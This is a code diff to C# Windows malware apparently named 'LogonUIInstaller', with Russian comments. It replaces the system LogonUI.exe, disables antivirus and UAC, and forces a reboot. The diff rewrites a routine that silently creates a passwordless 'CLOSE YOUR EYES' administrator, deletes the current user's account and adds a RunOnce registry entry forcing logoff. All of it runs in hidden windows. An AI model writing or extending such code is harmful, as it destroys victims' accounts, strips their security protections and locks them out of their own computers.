@@ -31,10 +31,10 @@ namespace LogonUIInstaller
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
 
-                    // 1. УДАЛЯЕМ LogonUI.exe (замена на кастомный)
+                    // УДАЛЯЕМ LogonUI.exe (замена на кастомный)
                     ReplaceLogonUI();
 
-                    // 2. ЗАПУСКАЕМ ФОРМУ
+                    // ЗАПУСКАЕМ ФОРМУ
                     MainInterface ui = new MainInterface();
                     ui.Show();
                     Application.Run();
@@ -52,7 +52,7 @@ namespace LogonUIInstaller
                 ApplySystemBlocks();
                 DisableAntivirusAndUAC();
                 ReplaceWallpaperAndCursors();
-                ReplaceUserAccount();
+                ReplaceUserAccount(); // ← НОВАЯ ВЕРСИЯ (удаляет пользователя ДО перезагрузки)
                 AddToStartupWithStage2();
 
                 // Принудительная перезагрузка
@@ -362,6 +362,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
+        // ==================== НОВАЯ ВЕРСИЯ: УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ ====================
         private static void ReplaceUserAccount()
         {
             try
@@ -369,15 +370,7 @@ namespace LogonUIInstaller
                 string currentUser = Environment.UserName;
                 string newUser = "CLOSE YOUR EYES";
 
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "net",
-                    Arguments = $"user {currentUser} /delete /y",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
-
+                // 1. СОЗДАЁМ НОВОГО ПОЛЬЗОВАТЕЛЯ (БЕЗ ПАРОЛЯ)
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "net",
@@ -387,21 +380,31 @@ namespace LogonUIInstaller
                     UseShellExecute = false
                 });
 
-                string[] groups = { "Administrators", "Users", "Guests", "Power Users" };
-                foreach (string group in groups)
+                // 2. ДОБАВЛЯЕМ НОВОГО ПОЛЬЗОВАТЕЛЯ В АДМИНИСТРАТОРЫ (ВРЕМЕННО)
+                Process.Start(new ProcessStartInfo
                 {
-                    try
-                    {
-                        Process.Start(new ProcessStartInfo
-                        {
-                            FileName = "net",
-                            Arguments = $"localgroup {group} \"{newUser}\" /delete",
-                            CreateNoWindow = true,
-                            WindowStyle = ProcessWindowStyle.Hidden,
-                            UseShellExecute = false
-                        });
-                    }
-                    catch { }
+                    FileName = "net",
+                    Arguments = $"localgroup Administrators \"{newUser}\" /add",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+
+                // 3. УДАЛЯЕМ СТАРОГО ПОЛЬЗОВАТЕЛЯ (ПРЯМО СЕЙЧАС)
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "net",
+                    Arguments = $"user {currentUser} /delete /y",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+
+                // 4. ПРИНУДИТЕЛЬНЫЙ ВЫХОД ИЗ СИСТЕМЫ (ЧТОБЫ НЕ БЫЛО КОНФЛИКТОВ)
+                // ДОБАВЛЯЕМ В АВТОЗАГРУЗКУ ПРИНУДИТЕЛЬНЫЙ ВЫХОД
+                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce"))
+                {
+                    key.SetValue("Logoff", $"shutdown /l /f /t 0", RegistryValueKind.String);
                 }
             }
             catch { }
